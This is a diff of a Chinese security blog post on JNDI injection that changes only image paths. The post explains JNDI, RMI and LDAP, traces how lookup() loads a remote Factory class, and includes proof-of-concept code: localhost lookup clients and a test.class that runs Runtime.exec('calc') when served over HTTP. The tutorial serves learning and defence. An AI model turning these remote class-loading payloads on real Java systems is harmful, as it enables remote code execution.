@@ -141,7 +141,7 @@ References：在一个实际的名称服务中，有些对象可能无法直接�
 	  		
 
 	  <h2 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>JNDI（Java Naming and Directory Interface，Java命名和目录接口）是SUN公司提供的一种标准的Java命名系统接口。JNDI提供统一的客户端API，并由管理者将JNDI API映射为特定的<strong>命名服务</strong>和<strong>目录服务</strong>，为开发人员查找和访问各种资源提供了统一的通用接口，可以用来定义用户、网络、机器、对象和服务等各种资源。简单来说，开发人员通过合理的使用JNDI，能够让用户通过统一的方式访问获取网络上的各种资源和服务。如下图所示</p>
-<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240320194727812.png" alt="image-20240320194727812"></p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240320194727812.png" alt="image-20240320194727812"></p>
 <h4 id="命名服务（Naming-Server）"><a href="#命名服务（Naming-Server）" class="headerlink" title="命名服务（Naming Server）"></a>命名服务（Naming Server）</h4><p>命名服务，简单来说，就是一种通过名称来查找实际对象的服务。比如我们的RMI协议，可以通过名称来查找并调用具体的远程对象。再比如我们的DNS协议，通过域名来查找具体的IP地址。这些都可以叫做命名服务。</p>
 <p>在命名服务中，有几个重要的概念。</p>
 <ul>
@@ -157,7 +157,7 @@ References：在一个实际的名称服务中，有些对象可能无法直接�
 <li>其他基于 X.500 (目录服务的标准) 实现的目录服务；</li>
 </ul>
 <h3 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h3><p><code>lookup()</code>函数的访问地址参数控制不当，则有可能导致加载远程恶意类。JNDI接口可以调用多个含有远程功能的服务，所以我们的攻击方式也多种多样。但流程大同小异，如下图所示</p>
-<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240320195215502.png" alt="image-20240320195215502"></p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240320195215502.png" alt="image-20240320195215502"></p>
 <h4 id="JNDI-RMI"><a href="#JNDI-RMI" class="headerlink" title="JNDI+RMI"></a>JNDI+RMI</h4><p>通过RMI进行JNDI注入，攻击者构造的恶意RMI服务器向客户端返回一个<code>Reference</code>对象，<code>Reference</code>对象中指定从远程加载构造的恶意<code>Factory</code>类，客户端在进行<code>lookup</code>的时候，会从远程动态加载攻击者构造的恶意<code>Factory</code>类并实例化，攻击者可以在构造方法或者是静态代码等地方加入恶意代码。</p>
 <p><code>javax.naming.Reference</code>构造方法为：<code>Reference(String className, String factory, String factoryLocation)</code>，</p>
 <ol>
@@ -177,17 +177,17 @@ References：在一个实际的名称服务中，有些对象可能无法直接�
 <p>客户端通过<code>InitialContext().lookup(&quot;rmi://127.0.0.1:1099/calc&quot;)</code>获取远程对象时，会执行我们的恶意代码</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JndiClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[]args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InitialContext</span>().lookup(<span class="string">&quot;rmi://127.0.0.1:1099/calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240322210853305.png" alt="image-20240322210853305"></p>
-<h4 id="JNDI原理探索"><a href="#JNDI原理探索" class="headerlink" title="JNDI原理探索"></a>JNDI原理探索</h4><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240324133202682.png" alt="image-20240324133202682"></p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240322210853305.png" alt="image-20240322210853305"></p>
+<h4 id="JNDI原理探索"><a href="#JNDI原理探索" class="headerlink" title="JNDI原理探索"></a>JNDI原理探索</h4><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240324133202682.png" alt="image-20240324133202682"></p>
 <p>跟进<code>com.sun.jndi.rmi.registry.RegistryContext#decodeObject</code>，</p>
-<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240324135842476.png" alt="image-20240324135842476"></p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240324135842476.png" alt="image-20240324135842476"></p>
 <p>这里将从服务端返回的<code>com.sun.jndi.rmi.registry.ReferenceWrapper_Stub#getReference</code>返回<code>Reference</code>对象</p>
-<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240324135551407.png" alt="image-20240324135551407"></p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240324135551407.png" alt="image-20240324135551407"></p>
 <p>跟进<code>javax.naming.spi.NamingManager#getObjectInstance</code>，此处为获取<code>Factory</code>类的实例</p>
-<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240324140614944.png" alt="image-20240324140614944"></p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240324140614944.png" alt="image-20240324140614944"></p>
 <p>跟进<code>javax.naming.spi.NamingManager#getObjectFactoryFromReference</code>，此处<code>clas = helper.loadClass(factoryName);</code>尝试从本地加载<code>Factory</code>类</p>
 <p>如果不存在本地不存在此类，则会从<code>codebase</code>中加载：<code>clas = helper.loadClass(factoryName, codebase);</code>会从远程加载我们恶意class，然后在<code>return</code>那里<code>return (clas != null) ? (ObjectFactory) clas.newInstance() : null;</code>对我们的恶意类进行一个实例化，进而加载我们的恶意代码。</p>
-<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240324141804449.png" alt="image-20240324141804449"></p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240324141804449.png" alt="image-20240324141804449"></p>
 <h3 id="JNDI-LDAP"><a href="#JNDI-LDAP" class="headerlink" title="JNDI+LDAP"></a>JNDI+LDAP</h3><h4 id="LDAP简介"><a href="#LDAP简介" class="headerlink" title="LDAP简介"></a>LDAP简介</h4><p>LDAP（Lightweight Directory Access Protocol ，轻型目录访问协议）是一种目录服务协议，运行在TCP&#x2F;IP堆栈之上。LDAP目录服务是由目录数据库和一套访问协议组成的系统，目录服务是一个特殊的数据库，用来保存描述性的、基于属性的详细信息，能进行查询、浏览和搜索，以树状结构组织数据。LDAP目录服务基于客户端-服务器模型，它的功能用于对一个存在目录数据库的访问。 LDAP目录和RMI注册表的区别在于是前者是目录服务，并允许分配存储对象的属性。</p>
 <p>也就是说，LDAP <strong>「是一个协议」</strong>，约定了 Client 与 Server 之间的信息交互格式、使用的端口号、认证方式等内容。而 <strong>「LDAP 协议的实现」</strong>，有着众多版本，例如微软的 Active Directory 是 LDAP 在 Windows 上的实现。AD 实现了 LDAP 所需的树形数据库、具体如何解析请求数据并到数据库查询然后返回结果等功能。再例如 OpenLDAP 是可以运行在 Linux 上的 LDAP 协议的开源实现。而我们平常说的 LDAP Server，一般指的是安装并配置了 Active Directory、OpenLDAP 这些程序的服务器。</p>
 <p>在LDAP中，我们是通过目录树来访问一条记录的，目录树的结构如下：</p>
@@ -221,7 +221,7 @@ References：在一个实际的名称服务中，有些对象可能无法直接�
 <p>JNDI_Test.java</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDI_Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Object object=<span class="keyword">new</span> <span class="title class_">InitialContext</span>().lookup(<span class="string">&quot;ldap://127.0.0.1:7777/calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240322212803353.png" alt="image-20240322212803353"></p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240322212803353.png" alt="image-20240322212803353"></p>
 <h4 id="Jdk-8u191-1"><a href="#Jdk-8u191-1" class="headerlink" title="Jdk &gt;&#x3D; 8u191"></a>Jdk &gt;&#x3D; 8u191</h4><p><strong>通过反序列</strong></p>
 <p>通过反序列，那么前提是客户端得有可用的<code>Gadgets</code></p>
 <p>LDAPServer.java</p>
@@ -233,7 +233,7 @@ References：在一个实际的名称服务中，有些对象可能无法直接�
 <p>test.class放http服务下</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">test</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240322214343240.png" alt="image-20240322214343240"></p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240322214343240.png" alt="image-20240322214343240"></p>
 
 	  <!--
 <div class="article-footer-copyright">
